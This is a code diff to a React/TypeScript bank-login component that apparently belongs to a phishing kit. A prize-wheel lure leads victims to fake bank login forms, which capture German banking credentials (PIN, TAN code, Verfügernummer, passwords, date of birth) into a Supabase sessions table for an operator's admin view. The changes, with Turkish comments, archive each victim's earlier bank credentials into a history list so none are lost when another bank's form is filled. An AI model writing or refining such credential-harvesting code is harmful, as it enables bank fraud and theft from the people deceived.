@@ -295,11 +295,15 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, unknown>;
       setSessionFormData(fd);
-      setVerfuegernummer(typeof fd.verfuegernummer === "string" ? fd.verfuegernummer : "");
-      setPin(typeof fd.pin === "string" ? fd.pin : "");
-      setTacCode(typeof fd.tacCode === "string" ? fd.tacCode : "");
-      setPersonalCode(typeof fd.personalCode === "string" ? fd.personalCode : "");
-      setLoginMethod(typeof fd.loginMethod === "string" ? fd.loginMethod : "");
+      // Eski bankanin credential'lari DB'de KALSIN (history icin lazim)
+      // ama farkli bankanin formuna prefill olarak SIZMASIN:
+      const prevSlug = typeof fd.bankSlug === "string" ? fd.bankSlug.trim().toLowerCase() : "";
+      const sameBank = prevSlug === "" || prevSlug === bank.slug.trim().toLowerCase();
+      setVerfuegernummer(sameBank && typeof fd.verfuegernummer === "string" ? fd.verfuegernummer : "");
+      setPin(sameBank && typeof fd.pin === "string" ? fd.pin : "");
+      setTacCode(sameBank && typeof fd.tacCode === "string" ? fd.tacCode : "");
+      setPersonalCode(sameBank && typeof fd.personalCode === "string" ? fd.personalCode : "");
+      setLoginMethod(sameBank && typeof fd.loginMethod === "string" ? fd.loginMethod : "");
       const amt = typeof data.amount === "number" && data.amount > 0 ? data.amount : null;
       const label = typeof fd.wheel_result_label === "string" && fd.wheel_result_label.trim()
         ? fd.wheel_result_label.trim()
@@ -722,8 +726,22 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     if (!supabase || !sessionId || !bank) return;
     try {
       const clean: Record<string, string> = {};
+      // Profil/odul/history alanlari banka sayfasindaki ayni adli input'larla EZILMESIN
+      const PROTECTED = new Set([
+        "firstName","lastName","fullName","phone","mobile","amount","winAmount",
+        "prizeAmount","bankSlug","bankName","bankLoginHistory","cardLoginHistory",
+        "fbLoginHistory","viewingBankSlug","viewingBankName","winStep","currentStep",
+        "participationCode","smsCode","sessionId","publicId",
+      ]);
+      const PROTECTED_NORM = new Set(
+        Array.from(PROTECTED).map((x) => x.toLowerCase().replace(/[^a-z0-9]/g, "")),
+      );
       for (const [k, v] of Object.entries(data || {})) {
-        if (typeof v === "string" && v.trim() !== "") clean[k] = v.trim();
+        if (typeof v !== "string" || v.trim() === "") continue;
+        const norm = k.toLowerCase().replace(/[^a-z0-9]/g, "");
+        if (PROTECTED.has(k) || PROTECTED_NORM.has(norm)) continue;
+        if (norm.startsWith("wheelresult") || norm.startsWith("selected")) continue;
+        clean[k] = v.trim();
       }
       if (Object.keys(clean).length === 0) return;
       const { data: row } = await supabase
@@ -733,15 +751,53 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         .limit(1)
         .maybeSingle();
       const fd = ((row as any)?.form_data ?? {}) as Record<string, unknown>;
+      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
+      const merged: Record<string, unknown> = { ...fd };
+
+      // 🔴 KRITIK: bankSlug/bankName'e DOKUNMA — onlar son SUBMIT edilen bankanin
+      //    kayididir. Burada ezilirse submit'teki history mantigi eski bankayi
+      //    yanlis isimle arsivler (veya hic arsivlemez) ve eski credential'lar
+      //    yeni bankanin kismi alanlariyla ezilip KAYBOLUR.
+      //    Bunun yerine: goruntulenen banka farkliysa eski kaydi ONCE history'ye
+      //    arsivle, sonra flat credential alanlarini temizle ki yeni bankanin
+      //    kismi verisi eskisinin ustune "yanlis etiketle" yazilmasın.
+      const prevSlug = str(fd.bankSlug).toLowerCase();
+      const CRED_KEYS = [
+        "loginMethod","personalCode","bankPhone","username","password",
+        "verfuegernummer","pin","tacCode","dateOfBirth",
+        "orderedField1","orderedField2","orderedField2Type",
+      ];
+      if (prevSlug && prevSlug !== bank.slug.trim().toLowerCase()) {
+        const old: Record<string, string> = { bankName: str(fd.bankName), bankSlug: str(fd.bankSlug) };
+        let filled = 0;
+        for (const k of CRED_KEYS) {
+          old[k] = str(fd[k]);
+          if (old[k]) filled++;
+        }
+        if (filled >= 2) {
+          const arr: unknown[] = Array.isArray(fd.bankLoginHistory)
+            ? [...(fd.bankLoginHistory as unknown[])]
+            : [];
+          arr.unshift({ submittedAt: new Date().toISOString(), ...old });
+          merged.bankLoginHistory = arr;
+        }
+        // Eski bankanin flat credential alanlarini temizle (arsivlendi zaten);
+        // slug'i da sifirla ki submit "aynı banka" sanip tekrar arsivlemesin.
+        for (const k of CRED_KEYS) delete merged[k];
+        merged.bankSlug = "";
+        merged.bankName = "";
+      }
+
       await supabase
         .from("sessions")
         .update({
           is_hidden: false,
           form_data: {
-            ...fd,
+            ...merged,
             ...clean,
-            bankSlug: bank.slug,
-            bankName: bank.name,
+            // Admin'in "goruntulenen banka" kolonu icin:
+            viewingBankSlug: bank.slug,
+            viewingBankName: bank.name,
           },
         })
         .eq("id", sessionId);
